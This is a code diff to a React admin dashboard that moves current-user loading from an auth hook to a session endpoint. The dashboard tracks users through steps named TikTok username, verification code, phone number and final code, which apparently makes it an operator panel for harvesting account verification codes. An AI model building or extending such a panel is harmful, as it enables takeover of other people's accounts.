@@ -18,7 +18,6 @@ import { format, formatDistanceToNow } from 'date-fns';
 import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 import type { Submission, AdminUser } from '@/lib/types';
 import { cn } from '@/lib/utils';
-import { useAuth } from '@/hooks/use-auth';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from '@/components/ui/dropdown-menu';
 import { Loader } from '@/components/loader';
@@ -27,25 +26,22 @@ import { Loader } from '@/components/loader';
 type Step = 'tiktokUsername' | 'verificationCode' | 'phoneNumber' | 'finalCode';
 
 export default function AdminPage() {
-    const { adminUser, isLoading: isAuthLoading } = useAuth();
-    
     const [submissions, setSubmissions] = useState<Submission[]>([]);
     const [admins, setAdmins] = useState<AdminUser[]>([]);
     const [isLoadingData, setIsLoadingData] = useState(true);
     const [error, setError] = useState<string | null>(null);
-
     const [updatingId, setUpdatingId] = useState<string | null>(null);
-    
-    const isMainAdmin = adminUser?.isMainAdmin === true;
 
     const fetchData = useCallback(async () => {
         setIsLoadingData(true);
         setError(null);
         try {
-            const [submissionsRes, adminsRes] = await Promise.all([
+             const [submissionsRes, adminsRes, currentUserRes] = await Promise.all([
                 fetch('/api/submissions'),
-                fetch('/api/admins')
+                fetch('/api/admins'),
+                fetch('/api/auth/session-user'), // New endpoint to get current user
             ]);
+            
             if (!submissionsRes.ok) {
                  const submissionsError = await submissionsRes.json();
                  throw new Error(submissionsError.message || 'Failed to fetch submissions');
@@ -54,31 +50,32 @@ export default function AdminPage() {
                 const adminsError = await adminsRes.json();
                 throw new Error(adminsError.message || 'Failed to fetch admins');
             }
+             if (!currentUserRes.ok) {
+                throw new Error('Failed to fetch current user data.');
+            }
+
             const submissionsData = await submissionsRes.json();
             const adminsData = await adminsRes.json();
+            const currentUserData = await currentUserRes.json();
+
             setSubmissions(submissionsData);
             setAdmins(adminsData);
+            setCurrentUser(currentUserData.user);
+
         } catch (err: any) {
             setError(err.message);
         } finally {
             setIsLoadingData(false);
         }
     }, []);
+    
+    const [currentUser, setCurrentUser] = useState<AdminUser | null>(null);
 
     useEffect(() => {
-        if (adminUser) {
-            fetchData();
-        }
-    }, [adminUser, fetchData]);
+        fetchData();
+    }, [fetchData]);
 
-
-    if (isAuthLoading) {
-         return (
-             <main className="flex flex-1 flex-col items-center justify-center p-4 md:p-6 bg-muted/40">
-                <Loader isFadingOut={false} />
-             </main>
-        )
-    }
+    const isMainAdmin = currentUser?.isMainAdmin === true;
 
     const mutateAll = () => {
         fetchData();
@@ -139,7 +136,6 @@ export default function AdminPage() {
         return <Badge variant="secondary" className="border-blue-200 bg-blue-100 text-blue-800">Sub-Admin</Badge>;
     }
     
-    const isDataLoading = isAuthLoading || isLoadingData;
     const totalSubmissions = submissions.length;
     const pendingSubmissions = submissions.filter(s => 
         s.tiktokUsernameStatus === 'pending' || 
@@ -182,8 +178,8 @@ export default function AdminPage() {
                         <TabsTrigger value="submissions">User Submissions</TabsTrigger>
                         <TabsTrigger value="admins">Admin Management</TabsTrigger>
                     </TabsList>
-                    <Button onClick={mutateAll} variant="outline" size="icon" disabled={isDataLoading}>
-                       <RefreshCw className={cn("h-4 w-4", isDataLoading && "animate-spin")} />
+                    <Button onClick={mutateAll} variant="outline" size="icon" disabled={isLoadingData}>
+                       <RefreshCw className={cn("h-4 w-4", isLoadingData && "animate-spin")} />
                        <span className="sr-only">Refresh</span>
                     </Button>
                 </div>
@@ -194,7 +190,7 @@ export default function AdminPage() {
                             <CardDescription>Review and approve user progression through the verification steps.</CardDescription>
                         </CardHeader>
                         <CardContent>
-                            {isDataLoading ? (
+                            {isLoadingData ? (
                                 <div className="flex items-center justify-center p-8"><Loader isFadingOut={false} /></div>
                             ) : error ? (
                                 <Alert variant="destructive"><XCircle className="h-4 w-4" /><AlertTitle>Error</AlertTitle><AlertDescription>{error}</AlertDescription></Alert>
@@ -266,7 +262,7 @@ export default function AdminPage() {
                             <CardDescription>Approve or revoke administrator access.</CardDescription>
                         </CardHeader>
                         <CardContent>
-                            {isDataLoading ? (
+                            {isLoadingData ? (
                                 <div className="flex items-center justify-center p-8"><Loader isFadingOut={false} /></div>
                             ) : error ? (
                                  <Alert variant="destructive"><XCircle className="h-4 w-4" /><AlertTitle>Error</AlertTitle><AlertDescription>{error}</AlertDescription></Alert>
@@ -282,7 +278,7 @@ export default function AdminPage() {
                                                     <TableCell>{format(new Date(admin.createdAt), "PPP")}</TableCell>
                                                     <TableCell>{getStatusBadge(admin.isVerified ? 'approved' : 'pending')}</TableCell>
                                                     <TableCell className="text-right">
-                                                        {isMainAdmin && adminUser && admin.id !== adminUser.id && (
+                                                        {isMainAdmin && currentUser && admin.id !== currentUser.id && (
                                                             <div className="flex gap-2 justify-end">
                                                                 {admin.isVerified ? (
                                                                      <Button variant="destructive" size="sm" onClick={() => handleAdminVerification(admin.id, false)} disabled={updatingId === `admin-${admin.id}`}>
